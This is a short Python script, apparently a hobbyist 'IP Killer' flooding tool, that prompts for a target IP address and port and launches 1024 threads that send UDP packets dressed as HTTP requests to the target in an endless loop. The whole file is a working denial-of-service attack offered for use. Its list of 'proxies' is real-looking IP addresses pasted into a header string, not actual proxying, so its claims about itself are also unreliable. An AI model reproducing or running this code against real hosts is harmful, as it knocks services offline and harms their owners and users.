
import os
import socket
import threading
import colorama 
from colorama import Fore, Back, Style

os.system("title IP Killer by 410'Sx10 $$")

def showProxies():
    print(proxies)

colorama.init()

print(Fore.RED)

print( """ ▄█     ▄███████▄         ▄█   ▄█▄  ▄█   ▄█        ▄█          ▄████████    ▄████████ 
███    ███    ███        ███ ▄███▀ ███  ███       ███         ███    ███   ███    ███ 
███▌   ███    ███        ███▐██▀   ███▌ ███       ███         ███    █▀    ███    ███ 
███▌   ███    ███       ▄█████▀    ███▌ ███       ███        ▄███▄▄▄      ▄███▄▄▄▄██▀ 
███▌ ▀█████████▀       ▀▀█████▄    ███▌ ███       ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
███    ███               ███▐██▄   ███  ███       ███         ███    █▄  ▀███████████ 
███    ███               ███ ▀███▄ ███  ███▌    ▄ ███▌    ▄   ███    ███   ███    ███ 
█▀    ▄████▀             ███   ▀█▀ █▀   █████▄▄██ █████▄▄██   ██████████   ███    ███ 
                         ▀              ▀         ▀                        ███    ███ """ )

target = input("IP to kill : ")
port = int(input("Port : "))
requests = 0
proxies = str({"186.10.246.8", "5.189.133.231", "196.53.85.183", "196.53.116.113", "3.11.214.31"})


def attacker():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((target, port))
        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        sock.sendto(("Host: " + proxies + "\r\n\r\n").encode('ascii'), (target, port))

        global requests
        requests += 1
        print("Attacking {} to the port {} with {} requests with proxies {}".format(target, port, requests, proxies))

        sock.close()


for i in range(1024):
    thread = threading.Thread(target=attacker)
    thread.start()
